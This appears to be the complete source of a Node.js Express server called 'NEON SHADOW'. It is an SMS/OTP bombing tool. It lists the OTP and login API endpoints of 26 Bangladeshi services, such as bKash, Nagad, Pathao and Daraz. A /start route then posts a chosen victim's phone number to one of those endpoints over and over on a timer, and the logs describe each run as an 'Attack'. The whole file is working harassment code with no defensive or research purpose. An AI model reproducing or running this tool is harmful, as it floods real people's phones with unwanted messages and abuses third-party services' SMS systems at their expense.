const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const sessions = new Map();

const services = {
  "Chorki": { url: "https://api-dynamic.chorki.com/v1/auth/login", body: { mobile: "{number}" } },
  "DocTime": { url: "https://api.doctime.com.bd/api/authenticate", body: { phone: "{number}" } },
  "RedX": { url: "https://api.redx.com.bd/v1/user/signup", body: { phone: "{number}" } },
  "Shikho": { url: "https://api.shikho.com/auth/v2/send/sms", body: { phone: "{number}" } },
  "KFC BD": { url: "https://api.kfcbd.com/register", body: { mobile_number: "{number}" } },
  "OsudPotro": { url: "https://api.osudpotro.com/api/v1/users/send_otp", body: { phone: "{number}" } },
  "Arogga": { url: "https://api.arogga.com/auth/v1/sms/send", body: { phone: "{number}" } },
  "Kabbik": { url: "https://api.kabbik.com/v1/auth/otpnew", body: { phone: "{number}" } },
  "Medeasy": { url: "https://api.medeasy.health/api/send-otp", body: { phone: "{number}" } },
  "Pathao": { url: "https://api.pathao.com/v1/auth/otp/send", body: { mobile: "{number}" } },
  "10 Minute School": { url: "https://api.10minuteschool.com/v1/auth/send-otp", body: { phone: "{number}" } },
  "Ostad": { url: "https://api.ostad.app/api/v1/auth/send-otp", body: { phone: "{number}" } },
  "Binge": { url: "https://binge.buzz/api/v1/auth/send-otp", body: { phone: "{number}" } },
  "Toffee": { url: "https://toffeelive.com/api/v1/login-otp", body: { phone: "{number}" } },
  "Chaldal": { url: "https://chaldal.com/api/customer/login", body: { phone: "{number}" } },
  "Shohoz": { url: "https://api.shohoz.com/v1/auth/send-otp", body: { phone: "{number}" } },
  "Jatri": { url: "https://api.jatri.co/api/v1/user/login", body: { phone_number: "{number}" } },
  "SteadFast": { url: "https://steadfast.com.bd/api/v1/login", body: { phone: "{number}" } },
  "Daraz": { url: "https://api.daraz.com.bd/auth/send-otp", body: { phone: "{number}" } },
  "Foodpanda": { url: "https://api.foodpanda.com.bd/v1/auth/otp", body: { phone_number: "{number}" } },
  "Nagad": { url: "https://api.nagad.com.bd/api/login", body: { mobileNumber: "{number}" } },
  "bKash": { url: "https://api.bkash.com/v1/login/otp", body: { phone: "{number}" } },
  "Sheba.xyz": { url: "https://api.sheba.xyz/v1/auth/send-otp", body: { mobile: "{number}" } },
  "HungryNaki": { url: "https://api.hungrynaki.com/v1/auth/otp", body: { phone: "{number}" } },
  "Walton": { url: "https://api.waltonbd.com/auth/otp", body: { mobile: "{number}" } },
  "AjkerDeal": { url: "https://api.ajkerdeal.com/api/v1/auth/otp", body: { mobile: "{number}" } }
};

app.get('/services', (req, res) => {
  res.json(Object.keys(services));
});

app.post('/start', (req, res) => {
  const { number, serviceName, intervalMs = 5000, maxRequests = 0 } = req.body;

  if (!number || !serviceName) {
    return res.status(400).json({ error: "Number and Service required" });
  }

  if (sessions.has(number)) {
    return res.json({ status: "already_running" });
  }

  let count = 0;
  const service = services[serviceName];

  console.log(`🚀 Attack Started → ${number} | Service: ${serviceName}`);

  const interval = setInterval(async () => {
    count++;
    try {
      const payloadStr = JSON.stringify(service.body).replace(/\{number\}/g, number);
      const payload = JSON.parse(payloadStr);

      await axios.post(service.url, payload, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 10000
      });

      console.log(`✅ [${count}] Success → ${number}`);
    } catch (err) {
      console.log(`❌ [${count}] Failed → ${number}`);
    }

    if (maxRequests > 0 && count >= maxRequests) {
      clearInterval(interval);
      sessions.delete(number);
      console.log(`🛑 Limit Reached for ${number}`);
    }
  }, intervalMs);

  sessions.set(number, interval);
  res.json({ status: "started" });
});

app.post('/stop', (req, res) => {
  const { number } = req.body;
  if (sessions.has(number)) {
    clearInterval(sessions.get(number));
    sessions.delete(number);
    res.json({ status: "stopped" });
  } else {
    res.json({ status: "not_running" });
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`\n🔥 NEON SHADOW Server Running`);
  console.log(`http://localhost:${PORT}`);
  console.log(`Ready to Attack...\n`);
});
